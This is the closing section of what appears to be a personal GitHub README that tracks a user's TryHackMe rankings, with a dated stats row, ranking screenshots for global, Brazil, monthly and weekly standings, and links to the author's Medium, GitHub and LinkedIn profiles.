| 2025, August 3    | 453      |     138ᵗʰ    |      5ᵗʰ     |   1,058ᵗʰ   |    19ᵗʰ    | 118,724  |    890    |    73     |


</div>

<p align="center">Global All Time:  138ᵗʰ<<br><img width="250px" src="https://github.com/user-attachments/assets/6da1c62c-69cf-4f39-bbe1-a0147faff1c8"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/45511d37-3323-4633-9472-64b48154efcd"><br><br>
                  Brazil All Time:     5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/b6c5d46e-0799-4d1f-9cd2-debc00cabc20"><br>
                  Global monthly:  1,058ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/8c0d69e1-9d07-491c-84b3-effe537c4192"><br>
                  Brazil monthly:     19ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/6ab43cbd-909f-40e9-aabf-a453ce9a843e"><br><br>
                  Weekly League:      10ᵗʰ<br><img width="250px" src="https://github.com/user-attachments/assets/c3698f2b-3d51-4b48-a4b1-bf8009b5ec35"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/e5d73334-a07f-4bfd-8636-57f72e1d9889"></p>

<br>
<h1 align="center">Thanks for Coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p> 
